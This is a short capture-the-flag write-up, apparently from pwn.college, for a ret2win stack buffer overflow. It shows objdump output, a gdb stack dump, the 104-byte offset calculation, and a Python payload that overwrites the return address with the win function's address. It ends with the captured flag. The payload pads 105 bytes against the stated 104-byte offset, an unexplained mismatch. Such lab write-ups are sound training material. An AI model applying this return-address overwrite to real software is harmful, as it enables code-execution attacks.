This challenge similar to the previous one. The only difference is that in this challenge there is no win variable which means we have to change the return address of the `challenge` function to the address of `win` function.

From `objdump`

    0000000000402020 g     F .text	0000000000000065              __libc_csu_init
    0000000000401d22 g     F .text	0000000000000107              win
    0000000000405168 g       .bss	0000000000000000              _end

The address of win function is `0x401d22`

Next we have to find out the offset of the address where return address is stored on stack from the input buffer.

    0x0000000000402001 <+193>:	call   0x401e29 <challenge>
    0x0000000000402006 <+198>:	lea    0x1180(%rip),%rdi        # 0x40318d
    0x000000000040200d <+205>:	call   0x401110 <puts@plt>

The return address of challenge function is `0x402006`

    0x7ffd46283b60:	0x00000d68	0x00000000	0x46284d28	0x00007ffd
    0x7ffd46283b70:	0x46284d18	0x00007ffd	0x0000000a	0x00000001
    0x7ffd46283b80:	0x836676a0	0x0000703d	0x000000c8	0x00000000
    0x7ffd46283b90:	0x41414141	0x0a414141	0x00000000	0x00000000
    0x7ffd46283ba0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x7ffd46283bb0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x7ffd46283bc0:	0x00000000	0x00000000	0x00000000	0x00000000
    0x7ffd46283bd0:	0x00000000	0x00000000	0x00402000	0x00000000
    (gdb) 
    0x7ffd46283be0:	0x46284c20	0x00000008	0x46283b90	0x00007ffd
    0x7ffd46283bf0:	0x46284c20	0x00007ffd	0x00402006	0x00000000

The return address is at `0x7ffd46283bf8`
The input buffer is at `0x7ffd46283b90`

The offset is `104`

The payload

    python -c 'import time,sys; sys.stdout.buffer.write(b"124"); time.sleep(2); sys.stdout.buffer.write(b"A"*105 + b"\x22\x1d\x40")' | ./program

The flag

    pwn.college{g80QCaswXzE9g3HBMmOP6kZE1wj.0FN5IDL5kzM1czW}
